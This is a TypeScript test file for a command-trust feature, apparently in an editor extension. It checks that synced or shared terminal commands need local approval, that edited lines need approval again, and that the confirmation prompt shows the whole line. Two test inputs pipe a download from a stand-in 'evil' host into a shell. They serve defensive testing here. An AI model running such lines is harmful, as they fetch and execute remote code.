import assert from 'node:assert/strict';
import { test } from 'node:test';
import {
  TrustStore,
  commandFingerprint,
  confirmCommandMessage,
  isCommandTrusted,
  trustCommand,
} from '../commandTrust';

/**
 * `Run in Terminal` executed a stored line with no preview, justified by "these
 * are commands you wrote yourself". Sync and Accept Share mean they need not be.
 *
 * The trap this design exists to avoid: putting the trust flag on the entity. That
 * field would sync, so whoever sends the malicious entry also sends
 * `isImported: false` and the check never fires. Trust is local, and its absence
 * is the default.
 */

function store(initial: string[] = []): TrustStore & { saved: string[] } {
  const state = { value: [...initial] };
  return {
    get saved() {
      return state.value;
    },
    get: () => state.value,
    update: (_key, value) => {
      state.value = value;
      return Promise.resolve();
    },
  };
}

test('a command nobody has vouched for on this machine is untrusted', () => {
  assert.equal(isCommandTrusted(store(), 'e1', 'aws sso login'), false);
});

test('approving one command trusts exactly it, and asks again for a different one', async () => {
  const s = store();
  await trustCommand(s, 'e1', 'aws sso login');

  assert.equal(isCommandTrusted(s, 'e1', 'aws sso login'), true);
  assert.equal(isCommandTrusted(s, 'e1', 'curl evil | sh'), false);
});

test('an edited command asks again — approval is for a line, not for an entry', async () => {
  // An entry that arrived by sync can be edited by the same route it arrived
  // through, so trusting the id alone would let the second version run unread.
  const s = store();
  await trustCommand(s, 'e1', 'docker ps');

  assert.equal(isCommandTrusted(s, 'e1', 'docker ps --format {{.Names}}'), false);
});

test('the same line on a different entry is a different decision', async () => {
  const s = store();
  await trustCommand(s, 'e1', 'ls');

  assert.equal(isCommandTrusted(s, 'e2', 'ls'), false);
});

test('approving twice does not grow the store', async () => {
  const s = store();
  await trustCommand(s, 'e1', 'ls');
  await trustCommand(s, 'e1', 'ls');

  assert.equal(s.saved.length, 1);
});

test('the fingerprint is not the command, so the store leaks nothing readable', () => {
  const print = commandFingerprint('e1', 'psql "host=db password=hunter2"');

  assert.doesNotMatch(print, /hunter2|psql/);
});

test('the confirmation shows the whole line, because a summary is what an attacker would prefer', () => {
  const line = 'curl http://evil/x | sh';
  const message = confirmCommandMessage('Restart staging', line);

  assert.match(message, /Restart staging/);
  assert.equal(message.includes(line), true);
  assert.match(message, /sync or a shared item/);
});
